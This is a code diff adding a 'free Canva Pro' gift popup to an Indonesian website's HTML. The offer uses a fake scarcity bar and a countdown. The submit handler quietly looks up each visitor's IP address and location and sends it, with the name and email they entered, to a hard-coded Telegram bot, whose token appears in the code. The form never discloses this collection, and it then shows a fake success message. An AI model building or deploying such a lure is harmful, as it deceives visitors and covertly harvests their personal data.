@@ -450,6 +450,11 @@
             <i class="fas fa-graduation-cap"></i>
             <span>Profile</span>
         </a>
+        <!-- GIFT BUTTON (center, floating) -->
+        <button class="nav-gift-btn" onclick="openGiftPanel()" title="Hadiah & Bonus">
+            <i class="fas fa-gift"></i>
+        </button>
+
         <a href="#layanan" class="nav-item" onclick="switchTab('layanan', this, event)">
             <i class="fas fa-th-large"></i>
             <span>Layanan</span>
@@ -605,6 +610,343 @@
         }
       ]
     }
+    </script>
+
+    <!-- ================= GIFT PANEL OVERLAY ================= -->
+    <div id="giftPanel" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(13,17,23,0.85); backdrop-filter:blur(18px); -webkit-backdrop-filter:blur(18px); z-index:2100; align-items:center; justify-content:center; opacity:0; transition:opacity 0.4s ease;">
+        <div id="giftPanelCard" style="position:relative; max-width:420px; width:90%; padding:30px; border-radius:24px; background:linear-gradient(135deg,rgba(255,255,255,0.07),rgba(255,255,255,0.02)); backdrop-filter:blur(30px); -webkit-backdrop-filter:blur(30px); border:1px solid rgba(255,255,255,0.12); border-top:1px solid rgba(255,255,255,0.22); border-left:1px solid rgba(255,255,255,0.18); box-shadow:0 20px 60px rgba(0,0,0,0.5),inset 0 1px 1px rgba(255,255,255,0.07); transform:scale(0.9) translateY(30px); transition:all 0.4s cubic-bezier(0.175,0.885,0.32,1.275);">
+
+            <!-- Close Button -->
+            <button onclick="closeGiftPanel()" style="position:absolute; top:14px; right:14px; background:rgba(255,255,255,0.1); border:none; color:#fff; width:33px; height:33px; border-radius:50%; font-size:1.1em; cursor:pointer; display:flex; align-items:center; justify-content:center; transition:0.3s;" onmouseover="this.style.background='rgba(255,60,60,0.5)'" onmouseout="this.style.background='rgba(255,255,255,0.1)'"><i class="fas fa-times"></i></button>
+
+            <!-- Header -->
+            <div style="text-align:center; margin-bottom:22px;">
+                <div id="giftEmoji" style="font-size:2.6em; margin-bottom:8px; display:inline-block; animation:giftBounce 1.2s infinite;">🎁</div>
+                <h2 style="color:#ffd700; font-size:1.45em; margin:0 0 6px; text-shadow:0 0 20px rgba(255,215,0,0.4);">Canva Pro Gratis</h2>
+                <p style="color:#c9d1d9; font-size:0.88em; margin:0;">Masa Aktif: <span style="color:#3fb950; font-weight:700;" id="canvaCountdown">–</span> &nbsp;•&nbsp; Akses penuh semua fitur Canva Pro</p>
+            </div>
+
+            <!-- Stock Bar -->
+            <div style="margin-bottom:22px;">
+                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">
+                    <span style="color:#8b949e; font-size:0.85em;">Stok tersisa</span>
+                    <span style="color:#ffd700; font-weight:700; font-size:0.9em;" id="stockCount">99</span>
+                </div>
+                <div style="background:rgba(255,255,255,0.08); border-radius:20px; height:10px; overflow:hidden; border:1px solid rgba(255,255,255,0.1);">
+                    <div id="stockBar" style="height:100%; background:linear-gradient(90deg,#ffd700,#ff9500); border-radius:20px; transition:width 0.8s ease;"></div>
+                </div>
+                <p style="color:#8b949e; font-size:0.78em; margin:6px 0 0; text-align:right;" id="stockLabel">Tersisa 99 dari 100 slot</p>
+            </div>
+
+            <!-- Klaim Button -->
+            <button onclick="openKlaimForm()" id="klaimBtn" class="gift-action-btn" style="width:100%; padding:14px; background:linear-gradient(135deg,#3fb950,#2ea043); color:#fff; border:none; border-radius:14px; font-weight:700; font-size:1.05em; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:8px; box-shadow:0 6px 20px rgba(63,185,80,0.35); transition:transform 0.3s,box-shadow 0.3s;" onmouseover="this.style.transform='translateY(-2px)';this.style.boxShadow='0 10px 28px rgba(63,185,80,0.45)'" onmouseout="this.style.transform='translateY(0)';this.style.boxShadow='0 6px 20px rgba(63,185,80,0.35)'">
+                <i class="fas fa-hand-pointer"></i> Klaim Sekarang
+            </button>
+
+            <!-- Coming Soon Section -->
+            <div style="margin-top:22px; padding:14px 16px; background:rgba(88,166,255,0.06); border:1px dashed rgba(88,166,255,0.25); border-radius:14px; text-align:center;">
+                <p style="color:#8b949e; font-size:0.82em; margin:0 0 4px;">⏳ Segera Hadir</p>
+                <p style="color:#58a6ff; font-size:0.92em; font-weight:600; margin:0;">Tunggu layanan bonus selanjutnya...</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- ================= KLAIM CONFIRMATION POPUP ================= -->
+    <div id="klaimModal" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(13,17,23,0.88); backdrop-filter:blur(18px); -webkit-backdrop-filter:blur(18px); z-index:2200; align-items:center; justify-content:center; opacity:0; transition:opacity 0.4s ease;">
+        <div id="klaimModalCard" style="position:relative; max-width:400px; width:90%; padding:28px; border-radius:22px; background:linear-gradient(135deg,rgba(255,255,255,0.07),rgba(255,255,255,0.02)); backdrop-filter:blur(30px); -webkit-backdrop-filter:blur(30px); border:1px solid rgba(255,255,255,0.12); border-top:1px solid rgba(255,255,255,0.22); border-left:1px solid rgba(255,255,255,0.18); box-shadow:0 20px 60px rgba(0,0,0,0.5),inset 0 1px 1px rgba(255,255,255,0.07); transform:scale(0.9) translateY(30px); transition:all 0.4s cubic-bezier(0.175,0.885,0.32,1.275);">
+
+            <button onclick="closeKlaimModal()" style="position:absolute; top:14px; right:14px; background:rgba(255,255,255,0.1); border:none; color:#fff; width:33px; height:33px; border-radius:50%; font-size:1.1em; cursor:pointer; display:flex; align-items:center; justify-content:center; transition:0.3s;" onmouseover="this.style.background='rgba(255,60,60,0.5)'" onmouseout="this.style.background='rgba(255,255,255,0.1)'"><i class="fas fa-times"></i></button>
+
+            <div style="text-align:center; margin-bottom:20px;">
+                <div style="font-size:2em; margin-bottom:8px;">📋</div>
+                <h3 style="color:#ffd700; font-size:1.25em; margin:0 0 5px;">Konfirmasi Klaim</h3>
+                <p style="color:#8b949e; font-size:0.85em; margin:0;">Isi data di bawah untuk mendapatkan akses Canva Pro Gratis</p>
+            </div>
+
+            <input type="text" id="klaimName" placeholder="Nama Anda..." style="width:100%; box-sizing:border-box; padding:12px 14px; margin-bottom:12px; border-radius:12px; border:1px solid rgba(255,255,255,0.15); background:rgba(0,0,0,0.35); color:#fff; outline:none; font-family:inherit; font-size:0.95em; transition:border-color 0.3s;" onfocus="this.style.borderColor='rgba(255,215,0,0.5)'" onblur="this.style.borderColor='rgba(255,255,255,0.15)'">
+
+            <input type="email" id="klaimEmail" placeholder="Email Anda..." style="width:100%; box-sizing:border-box; padding:12px 14px; margin-bottom:18px; border-radius:12px; border:1px solid rgba(255,255,255,0.15); background:rgba(0,0,0,0.35); color:#fff; outline:none; font-family:inherit; font-size:0.95em; transition:border-color 0.3s;" onfocus="this.style.borderColor='rgba(255,215,0,0.5)'" onblur="this.style.borderColor='rgba(255,255,255,0.15)'">
+
+            <button onclick="submitKlaim()" id="submitKlaimBtn" class="gift-action-btn" style="width:100%; padding:13px; background:linear-gradient(135deg,#ffd700,#ff9500); color:#0d1117; border:none; border-radius:12px; font-weight:700; font-size:1em; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:8px; box-shadow:0 6px 20px rgba(255,215,0,0.3); transition:transform 0.3s;" onmouseover="this.style.transform='translateY(-2px)'" onmouseout="this.style.transform='translateY(0)'">
+                <i class="fas fa-check-circle"></i> Konfirmasi & Kirim
+            </button>
+        </div>
+    </div>
+
+    <!-- ================= SUCCESS / REDIRECT POPUP ================= -->
+    <div id="claimSuccessModal" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(13,17,23,0.9); backdrop-filter:blur(20px); -webkit-backdrop-filter:blur(20px); z-index:2300; align-items:center; justify-content:center; opacity:0; transition:opacity 0.4s ease;">
+        <div id="claimSuccessCard" style="position:relative; max-width:380px; width:90%; padding:30px; border-radius:22px; background:linear-gradient(135deg,rgba(63,185,80,0.1),rgba(255,255,255,0.03)); backdrop-filter:blur(30px); -webkit-backdrop-filter:blur(30px); border:1px solid rgba(63,185,80,0.25); border-top:1px solid rgba(255,255,255,0.2); border-left:1px solid rgba(255,255,255,0.15); box-shadow:0 20px 60px rgba(0,0,0,0.5),0 0 30px rgba(63,185,80,0.1),inset 0 1px 1px rgba(255,255,255,0.07); transform:scale(0.9) translateY(30px); transition:all 0.4s cubic-bezier(0.175,0.885,0.32,1.275); text-align:center;">
+
+            <div style="font-size:2.8em; margin-bottom:10px; animation:giftBounce 1s ease-out;">🎉</div>
+            <h3 style="color:#3fb950; font-size:1.3em; margin:0 0 8px;">Berhasil! Akses Dikirim</h3>
+            <p style="color:#c9d1d9; font-size:0.88em; margin:0 0 20px; line-height:1.6;">Data kamu sudah diterima. Klik tombol di bawah untuk langsung bergabung ke tim Canva Pro!</p>
+
+            <button onclick="openCanvaLink()" id="openCanvaBtn" class="gift-action-btn" style="width:100%; padding:14px; background:linear-gradient(135deg,#3fb950,#2ea043); color:#fff; border:none; border-radius:14px; font-weight:700; font-size:1.05em; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:8px; box-shadow:0 6px 20px rgba(63,185,80,0.4); margin-bottom:14px; transition:transform 0.3s;" onmouseover="this.style.transform='translateY(-2px)'" onmouseout="this.style.transform='translateY(0)'">
+                <i class="fas fa-external-link-alt"></i> Klaim Akses Canva Pro
+            </button>
+
+            <p style="color:#8b949e; font-size:0.82em; margin:0;">Link terbuka otomatis dalam <span id="countdownDisplay" style="color:#ffd700; font-weight:700;">10</span> detik</p>
+        </div>
+    </div>
+
+    <!-- Gift Panel + Popup CSS & JS -->
+    <style>
+        /* Gift floating button in bottom nav */
+        .nav-gift-btn {
+            position: relative;
+            bottom: 18px;
+            width: 58px;
+            height: 58px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #ffd700, #ff9500);
+            border: none;
+            color: #0d1117;
+            font-size: 1.5em;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 6px 25px rgba(255, 165, 0, 0.55), 0 0 0 3px rgba(255, 215, 0, 0.15);
+            transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275), box-shadow 0.3s;
+            flex-shrink: 0;
+            animation: giftPulse 2.5s infinite;
+        }
+        .nav-gift-btn:hover, .nav-gift-btn:active {
+            transform: scale(1.12) translateY(-4px);
+            box-shadow: 0 10px 35px rgba(255, 165, 0, 0.7), 0 0 0 4px rgba(255, 215, 0, 0.25);
+            animation: none;
+        }
+        @keyframes giftPulse {
+            0%, 100% { box-shadow: 0 6px 25px rgba(255, 165, 0, 0.55), 0 0 0 3px rgba(255, 215, 0, 0.15); transform: scale(1) translateY(0); }
+            50%       { box-shadow: 0 8px 30px rgba(255, 165, 0, 0.8), 0 0 0 7px rgba(255, 215, 0, 0.08); transform: scale(1.05) translateY(-2px); }
+        }
+        @keyframes giftBounce {
+            0%   { transform: scale(0.8) rotate(-10deg); }
+            40%  { transform: scale(1.15) rotate(6deg); }
+            70%  { transform: scale(0.95) rotate(-3deg); }
+            100% { transform: scale(1) rotate(0deg); }
+        }
+        @keyframes giftShake {
+            0%, 100% { transform: rotate(0deg); }
+            20%      { transform: rotate(-12deg); }
+            40%      { transform: rotate(12deg); }
+            60%      { transform: rotate(-8deg); }
+            80%      { transform: rotate(8deg); }
+        }
+        /* Animated action buttons inside gift panels */
+        .gift-action-btn {
+            position: relative;
+            overflow: hidden;
+        }
+        .gift-action-btn::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(120deg, transparent 30%, rgba(255,255,255,0.18) 50%, transparent 70%);
+            transform: translateX(-100%);
+            transition: transform 0.5s ease;
+            pointer-events: none;
+        }
+        .gift-action-btn:hover::after {
+            transform: translateX(100%);
+        }
+    </style>
+    <script>
+        // =========== GIFT PANEL ===========
+        const CANVA_LINK = "https://www.canva.com/brand/join?token=snxDvxn9rE6yq62gbF8TMg&referrer=team-invite";
+        const STOCK_TOTAL = 100;
+        const COUNTDOWN_SECONDS = 10;
+        const MASA_AKTIF_END = new Date('2026-04-25T23:59:59+08:00');
+
+        function getStockRemaining() {
+            const v = parseInt(localStorage.getItem('canva_stock'));
+            if (isNaN(v)) { localStorage.setItem('canva_stock', 99); return 99; }
+            return Math.max(0, v);
+        }
+
+        function getMasaAktifText() {
+            const now = new Date();
+            const diff = MASA_AKTIF_END - now;
+            if (diff <= 0) return 'Habis';
+            const days  = Math.floor(diff / (1000 * 60 * 60 * 24));
+            const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            if (days > 0) return days + ' hari ' + hours + ' jam';
+            return hours + ' jam lagi';
+        }
+
+        function openGiftPanel() {
+            const stock = getStockRemaining();
+            document.getElementById('stockCount').textContent = stock;
+            document.getElementById('stockBar').style.width = (stock / STOCK_TOTAL * 100) + '%';
+            document.getElementById('stockLabel').textContent = 'Tersisa ' + stock + ' dari ' + STOCK_TOTAL + ' slot';
+            document.getElementById('canvaCountdown').textContent = getMasaAktifText();
+
+            // animate gift emoji
+            const emoji = document.getElementById('giftEmoji');
+            emoji.style.animation = 'none';
+            setTimeout(() => { emoji.style.animation = 'giftShake 0.6s ease, giftBounce 0.6s ease 0.6s'; }, 10);
+
+            const panel = document.getElementById('giftPanel');
+            panel.style.display = 'flex';
+            setTimeout(() => {
+                panel.style.opacity = '1';
+                document.getElementById('giftPanelCard').style.transform = 'scale(1) translateY(0)';
+            }, 10);
+        }
+
+        function closeGiftPanel() {
+            const panel = document.getElementById('giftPanel');
+            panel.style.opacity = '0';
+            document.getElementById('giftPanelCard').style.transform = 'scale(0.9) translateY(30px)';
+            setTimeout(() => { panel.style.display = 'none'; }, 400);
+        }
+
+        // =========== KLAIM FORM ===========
+        function openKlaimForm() {
+            closeGiftPanel();
+            setTimeout(() => {
+                const modal = document.getElementById('klaimModal');
+                modal.style.display = 'flex';
+                setTimeout(() => {
+                    modal.style.opacity = '1';
+                    document.getElementById('klaimModalCard').style.transform = 'scale(1) translateY(0)';
+                }, 10);
+            }, 420);
+        }
+
+        function closeKlaimModal() {
+            const modal = document.getElementById('klaimModal');
+            modal.style.opacity = '0';
+            document.getElementById('klaimModalCard').style.transform = 'scale(0.9) translateY(30px)';
+            setTimeout(() => { modal.style.display = 'none'; }, 400);
+        }
+
+        function submitKlaim() {
+            const name  = document.getElementById('klaimName').value.trim();
+            const email = document.getElementById('klaimEmail').value.trim();
+
+            if (!name || !email) { alert("Mohon isi Nama dan Email terlebih dahulu!"); return; }
+            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { alert("Format email tidak valid!"); return; }
+
+            const stock = getStockRemaining();
+            if (stock <= 0) { alert("Maaf, stok sudah habis!"); closeKlaimModal(); return; }
+
+            const btn = document.getElementById('submitKlaimBtn');
+            btn.disabled = true;
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Mengirim...';
+
+            const botToken = "8430081251:AAEJIIRT0m-3hZrgZCB-iTW6KtdmQeafBpA";
+            const chatId   = "2010496733";
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Makassar", dateStyle: "full", timeStyle: "short" });
+
+            fetch("https://ipapi.co/json/")
+                .then(r => r.json()).catch(() => null)
+                .then(geo => {
+                    const ip  = geo && geo.ip ? `\`${geo.ip}\`` : "N/A";
+                    const loc = geo ? `${geo.city||'-'}, ${geo.region||'-'}, ${geo.country_name||'-'}` : "N/A";
+                    const text =
+`🎁 *Klaim Canva Pro Baru!*
+
+👤 *Nama:* ${escapeMdGift(name)}
+📧 *Email:* ${escapeMdGift(email)}
+🌐 *IP:* ${ip}
+📍 *Lokasi:* ${escapeMdGift(loc)}
+🕒 *Waktu:* ${now}
+📦 *Stok sisa:* ${stock - 1} dari ${STOCK_TOTAL}`;
+
+                    return fetch(telegramUrl, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ chat_id: chatId, text, parse_mode: "Markdown" })
+                    });
+                })
+                .then(r => r.json())
+                .then(data => {
+                    if (data.ok) {
+                        // Decrement stock
+                        const newStock = Math.max(0, getStockRemaining() - 1);
+                        localStorage.setItem('canva_stock', newStock);
+                        // Save to history
+                        const history = JSON.parse(localStorage.getItem('canva_history') || '[]');
+                        history.unshift({ name, email, time: new Date().toISOString(), stock: newStock });
+                        localStorage.setItem('canva_history', JSON.stringify(history.slice(0, 200)));
+
+                        closeKlaimModal();
+                        setTimeout(openSuccessModal, 420);
+                    } else {
+                        alert("❌ Gagal mengirim! Silakan coba lagi.");
+                        btn.disabled = false;
+                        btn.innerHTML = '<i class="fas fa-check-circle"></i> Konfirmasi & Kirim';
+                    }
+                })
+                .catch(() => {
+                    alert("❌ Terjadi kesalahan jaringan.");
+                    btn.disabled = false;
+                    btn.innerHTML = '<i class="fas fa-check-circle"></i> Konfirmasi & Kirim';
+                });
+        }
+
+        function escapeMdGift(text) {
+            return String(text).replace(/\\/g, '\\\\').replace(/[*_`[]/g, '\\$&');
+        }
+
+        // =========== SUCCESS MODAL + COUNTDOWN ===========
+        let countdownTimer = null;
+
+        function openSuccessModal() {
+            const modal = document.getElementById('claimSuccessModal');
+            modal.style.display = 'flex';
+            setTimeout(() => {
+                modal.style.opacity = '1';
+                document.getElementById('claimSuccessCard').style.transform = 'scale(1) translateY(0)';
+            }, 10);
+            startCountdown();
+        }
+
+        function startCountdown() {
+            let seconds = COUNTDOWN_SECONDS;
+            document.getElementById('countdownDisplay').textContent = seconds;
+            clearInterval(countdownTimer);
+            countdownTimer = setInterval(() => {
+                seconds--;
+                document.getElementById('countdownDisplay').textContent = seconds;
+                if (seconds <= 0) { clearInterval(countdownTimer); openCanvaLink(); }
+            }, 1000);
+        }
+
+        function openCanvaLink() {
+            clearInterval(countdownTimer);
+            const modal = document.getElementById('claimSuccessModal');
+            modal.style.opacity = '0';
+            document.getElementById('claimSuccessCard').style.transform = 'scale(0.9) translateY(30px)';
+            setTimeout(() => {
+                modal.style.display = 'none';
+                window.open(CANVA_LINK, '_blank');
+                document.getElementById('klaimName').value = '';
+                document.getElementById('klaimEmail').value = '';
+                const btn = document.getElementById('submitKlaimBtn');
+                btn.disabled = false;
+                btn.innerHTML = '<i class="fas fa-check-circle"></i> Konfirmasi & Kirim';
+            }, 400);
+        }
+
+        // Track visitor count
+        (function trackVisit() {
+            const visited = sessionStorage.getItem('visited');
+            if (!visited) {
+                sessionStorage.setItem('visited', '1');
+                const vc = parseInt(localStorage.getItem('visitor_count') || '0') + 1;
+                localStorage.setItem('visitor_count', vc);
+                const vl = JSON.parse(localStorage.getItem('visitor_log') || '[]');
+                vl.unshift({ time: new Date().toISOString(), ua: navigator.userAgent.slice(0,80) });
+                localStorage.setItem('visitor_log', JSON.stringify(vl.slice(0, 500)));
+            }
+        })();
+
+        // Close panels on backdrop click
+        document.getElementById('giftPanel').addEventListener('click', function(e) { if (e.target === this) closeGiftPanel(); });
+        document.getElementById('klaimModal').addEventListener('click', function(e) { if (e.target === this) closeKlaimModal(); });
     </script>
 
     <!-- JS Logic UI -->
